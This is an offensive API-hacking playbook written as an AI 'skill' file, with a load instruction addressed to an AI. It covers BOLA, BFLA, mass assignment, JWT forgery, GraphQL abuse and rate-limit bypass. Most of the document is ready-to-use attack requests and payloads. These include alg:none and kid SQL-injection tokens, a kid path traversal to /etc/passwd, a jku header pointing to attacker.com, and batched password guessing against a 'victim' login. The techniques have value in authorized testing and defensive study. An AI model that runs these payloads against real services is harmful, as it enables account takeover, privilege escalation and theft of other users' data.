# SKILL: API Security Testing — Expert Attack Playbook (BOLA, BFLA, Mass Assignment, Rate Limiting)

> **AI LOAD INSTRUCTION**: Expert API hacking techniques focused on the OWASP API Top 10 most impactful vulnerabilities. Covers BOLA A-B testing, BFLA methodology, mass assignment discovery, JWT attacks, GraphQL exploitation, rate limit bypass, and API versioning attacks. This is the most important skill for modern bug bounty.

---

## 1. API RECONNAISSANCE

### Discover API Endpoints
```bash
# JavaScript bundle mining:
curl https://target.com/app.js | grep -oE '(/api/v[0-9])[^"' ]+' | sort -u

# Swagger/OpenAPI discovery:
/api/swagger.json
/api/v1/swagger.json
/swagger/v1/swagger.json
/openapi.json
/api-docs
/docs

# Common API paths:
/api/v1/
/api/v2/
/rest/
/graphql
/gql
/.well-known/

# Wayback Machine:
curl "https://web.archive.org/cdx/search/cdx?url=target.com/api/*&output=text&fl=original&collapse=urlkey"
```

### Read API Documentation
Check for:
- All request parameters (especially optional/hidden ones)
- Different request bodies for admin vs regular user endpoints
- Deprecated endpoint warnings (old versions still work!)
- `additionalProperties: true` in JSON schema → mass assignment hint

---

## 2. BOLA / IDOR (API Object Level Authorization)

BOLA = API validates **authentication** but not **authorization** on object access.

### Systematic A-B Test Protocol
```
1. Register Account_A and Account_B (different sessions/browsers)
2. As Account_A, perform ALL operations:
   - Create resources (note all returned IDs)
   - View resources (capture all IDs in responses)
   - Update resources
3. Switch to Account_B's token
4. Replay every Account_A request verbatim (only token changed)
5. 200 OK with Account_A's data → BOLA confirmed
```

### BOLA Test Payloads
```http
# Original (your resource):
GET /api/v1/users/5678/invoices/1001  Authorization: Bearer TOKEN_B

# Attack (other user's resource):
GET /api/v1/users/1234/invoices/1001  Authorization: Bearer TOKEN_B
GET /api/v1/users/5678/invoices/1099  Authorization: Bearer TOKEN_B  ← different invoice

# Nested resource without parent check:
GET /api/v1/invoices/1099             Authorization: Bearer TOKEN_B

# Different HTTP methods:
DELETE /api/v1/users/1234/invoices/1001
PUT /api/v1/users/1234/profile {"email":"attacker@evil.com"}
PATCH /api/v1/users/1234/settings {"notifications": false}
```

---

## 3. BFLA (Broken Function Level Authorization)

BFLA = regular user accesses admin-level **functions** (not just data).

### Admin Endpoint Discovery
```bash
# wordlist-based:
ffuf -u https://api.target.com/FUZZ -w /path/to/api-endpoints.txt \
     -H "Authorization: Bearer USER_TOKEN" -mc 200,201,204

# Common admin prefixes:
/api/v1/admin/**
/api/v1/management/**
/api/v1/internal/**
/api/v1/system/**
/api/v1/ops/**
/api/v1/console/**

# Common admin actions:
/api/v1/users         (GET all users - privileged)
/api/v1/users/{id}    (GET any user's data)
POST /api/v1/users    (Create user as admin)
DELETE /api/v1/users/{id}
PUT /api/v1/users/{id}/role
GET /api/v1/audit-logs
GET /api/v1/analytics/all
```

### BFLA Hidden in UI
Compare HTTP calls in normal user dashboard vs admin dashboard (if you have test admin access). Same endpoint, different role → test without admin role.

---

## 4. MASS ASSIGNMENT EXPLOITATION

When API accepts extra/undocumented JSON fields that modify privileged model attributes.

### Discovery Approach
```
Step 1: Find registration or create/edit endpoints (POST/PUT/PATCH)
Step 2: Look at API docs for "admin create user" vs "user register" — diff the fields
Step 3: Identify object attributes that regular users shouldn't control:
        role, isAdmin, admin, verified, creditBalance, subscription, tier, group, org
Step 4: Add these fields to your registration/update request
```

### Mass Assignment Payloads
```json
// Registration:
POST /api/v1/users/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "Pass1234!",
  "role": "admin",
  "isAdmin": true,
  "isVerified": true,
  "plan": "enterprise",
  "credits": 99999
}

// Profile update:
PUT /api/v1/users/me
{
  "name": "New Name",
  "role": "admin",           ← hidden field
  "accountType": "premium"   ← hidden field
}

// Organization assignment:
POST /api/v1/users/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "Pass1234!",
  "org": "TargetCompany"     ← join any org, fuzz org names
}
```

### Automated Mass Assignment Test (Burp)
Use Intruder with a wordlist of common property names:
```
admin, isAdmin, role, privileged, verified, active, subscription,
plan, tier, permissions, groups, org, owner, superuser, flag
```

---

## 5. JWT ATTACKS

JWT structure: `BASE64URL(header).BASE64URL(payload).BASE64URL(signature)`

### Decode and Inspect
```bash
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
# → {"typ":"JWT","alg":"HS256"}

echo "eyJ1c2VyX2lkIjoxMjM0fQ" | base64 -d
# → {"user_id":1234}
```

### Attack 1: Algorithm "none" (alg:none)
```json
// Modify header:
{"alg":"none","typ":"JWT"}
// Remove signature (keep trailing dot):
header.payload.
// OR:
header.payload
```
If server accepts → no signature validation!

### Attack 2: RS256 → HS256 Confusion
```
When server uses RS256 (asymmetric):
- Server has private RSA key (signs), public key (verifies)
- Attack: switch alg to HS256, sign with RSA PUBLIC KEY as HMAC secret
- Server might verify HS256 signature using its "public key" as symmetric secret
```

### Attack 3: JWT Secret Brute Force
```bash
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt
# or:
python3 jwt_cracker.py -t JWT_TOKEN -w wordlist.txt
```

### Attack 4: kid (Key ID) SQL Injection
```json
// Header:
{"alg":"HS256","kid":"' UNION SELECT 'attacker_key'--"}
// Then sign with 'attacker_key' as HMAC secret
```

### Attack 5: kid Path Traversal
```json
{"alg":"HS256","kid":"../../../../dev/null"}
// Signs with empty string as key
// Or: {"kid":"../../../../etc/passwd"} → signs with /etc/passwd content
```

### Attack 6: jku / x5u Header Injection
```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
// Server fetches YOUR JWKS to verify → host malicious keys
```

---

## 6. RATE LIMIT BYPASS

When bruteforce/enumeration is blocked by rate limiting:

```http
# Header spoofing (server trusts proxy headers):
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
X-Remote-IP: 13.14.15.16
Forwarded: for=17.18.19.20

# Cycle through different fake IPs with each request

# User-Agent rotation:
User-Agent: Mozilla/5.0 (request 1)
User-Agent: Chrome/115.0 (request 2)

# Path variation (same endpoint, different representation):
/api/v1/users/login
/api/v1/users/LOGIN
/API/v1/users/login
/api/v1/users/login/
/api/v1/users//login

# Parameter pollution:
username=victim&password=guess1
username=victim&password=guess1&username=victim  ← duplicate
```

---

## 7. API VERSIONING ATTACKS

New API versions fix vulnerabilities. **Old versions often still accessible**:

```
Deprecated /api/v1/ → security fixes in /api/v2/
Test:
/api/v1/users/{id}     ← BOLA fixed in v2 but v1 still works
/v1/admin/users        ← auth added in v2, v1 unprotected
/api/mobile/v1/        ← mobile endpoints often less secure (separate codebase)
```

**Check JS bundles**: mobile apps often reference old API versions explicitly.

---

## 8. GRAPHQL EXPLOITATION

### Introspection (should be disabled in prod)
```graphql
query {
  __schema {
    types {
      name
      fields { name }
    }
  }
}
```
If enabled → full schema dump → discover all queries, mutations, types.

### Bypass Disabled Introspection
```graphql
# Use field suggestions (Clairvoyance tool):
query { __typename }  # base test

# Aliases to extract schema:
query {
  __type(name: "User") {
    fields { name type { name } }
  }
}
```

### GraphQL IDOR
```graphql
query {
  user(id: "5678") {     ← other user's ID
    name
    email
    privateData
  }
}
```

### GraphQL Batching (Rate Limit Bypass)
```json
[
  {"query": "mutation { login(username: \"victim\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"victim\", password: \"pass2\") { token } }"},
  ... (999 more)
]
```

---

## 9. API TESTING METHODOLOGY (ZSEANO / OWASP)

```
1. Collect all endpoints (JS, Swagger, Wayback, brute-force)
2. Authenticate as normal user
3. For each endpoint:
   - Test all HTTP methods (GET/POST/PUT/PATCH/DELETE)
   - Test BOLA: substitute other user's IDs
   - Test BFLA: call admin functions with user token
   - Test mass assignment: add extra fields to POST/PUT body
4. Check JWT token: decode, look for role/privilege claims → modify
5. Try unauthenticated: remove Authorization header entirely
6. Try old API versions (/v1, /v2, /mobile, /legacy)
7. Check for GraphQL (/graphql, /gql, /v1/graphql)
8. Test rate limiting: header bypass, path variation
```

---

## 10. COMMON API ATTACK QUICK REFERENCE

| Attack | Payload / Method |
|---|---|
| BOLA | Use victim object ID with own token |
| BFLA | Call `/admin/` endpoints as regular user |
| Mass Assignment | Add `"role":"admin"` to registration |
| JWT alg:none | Set "alg":"none", drop signature |
| JWT secret crack | hashcat -m 16500 against rockyou |
| Rate limit bypass | Rotate X-Forwarded-For IPs |
| API version | Try /v1/ when /v2/ is patched |
| GraphQL IDOR | Change id in query to victim's |
| Batch abuse | Array of 100s of mutations in one request |
